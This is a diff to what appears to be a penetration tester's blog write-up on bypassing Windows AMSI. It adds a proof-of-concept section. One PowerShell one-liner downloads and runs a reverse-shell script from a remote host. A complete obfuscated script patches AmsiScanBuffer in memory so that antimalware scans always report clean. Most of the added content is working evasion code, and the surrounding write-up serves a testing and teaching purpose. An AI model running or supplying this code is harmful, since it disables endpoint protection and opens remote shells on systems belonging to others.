@@ -28,12 +28,53 @@ Memory patching: Modify the AMSI Dynamic Link Library (DLL) in memory to either 
 Powershell Downgrade: Downgrade to Windows PowerShell 2.0. It lacks essential security controls like AMSI protection, making it susceptible to exploitation as a means of evasion.
 
 ## Proof of Concept
-![](/assets/AV/Final.gif)   
 
+![](/assets/AV/Final.gif)   
+To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through powershell using the below command
 ```bash
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
 ```
+However, as seen above, AMSI sucessfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
+In order to bypass the AMSI, the tester 
+```bash
+$thing = @"
+// thing 
+// using System.Collections.ArrayList;
+using System; // thingssa
+using System.Runtime.InteropServices;
+public class payload {
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+}
+"@
+Add-Type $thing
+[System.Collections.ArrayList]$Patch = 0xB8, 0x57, 0x90, 0x90, 0x00, 0x90, 0x07, 0x80, 0x90, 0xC3
+$Patch.Remove(0x90)
+$Patch.Remove(0x90)
+$Patch.Remove(0x90)
+$Patch.Remove(0x90)
 
+[byte[]]$byteArrayFun = "","","","","",""
+$byteArrayFun[0] = $Patch[0]
+$byteArrayFun[1] = $Patch[1]
+$byteArrayFun[2] = $Patch[2]
+$byteArrayFun[3] = $Patch[3]
+$byteArrayFun[4] = $Patch[4]
+$byteArrayFun[5] = $Patch[5]
+
+$why = "Am" +"s" + "iSc" + "a" + "nBu" + "ffer"
+$hmm = "a" + "m" + "si" + ".dl" + "l"
+$librarz = [payload]::LoadLibrary($hmm)
+$dest = [payload]::GetProcAddress($librarz, $why)
+$p = 0
+[payload]::VirtualProtect($dest, [uint32]5, 0x40, [ref]$p)
+
+[System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
+```
 
 ## Memory Patching
 Daniel Duggan released an AMSI bypass which patches the AmsiScanBuffer() function in order to return always AMSI_RESULT_CLEAN which indicates that no detection has been found. The patch is displayed in the following line:
